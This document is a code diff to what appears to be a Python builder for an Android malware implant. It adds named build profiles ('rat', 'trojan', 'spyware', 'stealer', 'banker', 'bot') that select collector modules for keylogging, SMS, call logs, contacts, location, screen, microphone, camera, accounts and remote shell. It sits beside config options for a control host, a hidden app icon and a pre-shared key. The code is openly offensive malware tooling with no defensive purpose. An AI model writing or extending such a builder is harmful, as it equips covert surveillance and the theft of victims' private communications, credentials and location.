@@ -39,6 +39,24 @@ class BuildError(Exception):
 
 ABIS = ("arm64-v8a", "armeabi-v7a", "x86_64")
 
+# Spec → which collector modules the implant may run. Every spec keeps the
+# core (info/ping/perm_status) plus whatever it names; the dispatcher refuses
+# the rest so a stolen build reveals its shape to nobody.
+SPECS: Dict[str, List[str]] = {
+    "rat": ["keylog", "sms", "calls", "contacts", "loc", "notif", "clip",
+            "files", "shell", "apps", "wifi", "accounts", "usage", "screen",
+            "mic", "cam", "native"],
+    "trojan": ["keylog", "sms", "calls", "contacts", "loc", "notif",
+               "files", "shell", "apps", "native"],
+    "spyware": ["keylog", "notif", "loc", "clip", "screen", "mic", "usage", "native"],
+    "malware": ["sms", "calls", "shell", "files", "apps", "keylog", "native"],
+    "stealer": ["sms", "calls", "contacts", "accounts", "wifi", "files", "apps"],
+    "banker": ["keylog", "notif", "clip", "apps", "screen"],
+    "bot": ["shell", "files", "apps", "native"],
+    "minimal": [],
+}
+CORE_MODULES = ["info", "ping", "perm_status"]
+
 
 @dataclass
 class Toolchain:
@@ -382,6 +400,7 @@ def make_config(
     interval_ms: int,
     hide_icon: bool,
     pin_sha256: Optional[str],
+    spec: str = "rat",
 ) -> Dict[str, object]:
     if not psk_b64:
         raise BuildError("empty psk")
@@ -398,7 +417,12 @@ def make_config(
     parsed = urlparse(host)
     base_port = parsed.port or (443 if parsed.scheme == "https" else 80)
     interval = max(15_000, min(int(interval_ms), 6 * 60 * 60 * 1000))
+    spec = spec.lower().strip()
+    if spec not in SPECS:
+        raise BuildError(f"unknown spec {spec!r} — choose {', '.join(sorted(SPECS))}")
     return {
+        "spec": spec,
+        "modules": sorted(set(CORE_MODULES + SPECS[spec])),
         "host": host.rstrip("/"),
         "psk": psk_b64,
         "label": label[:64],
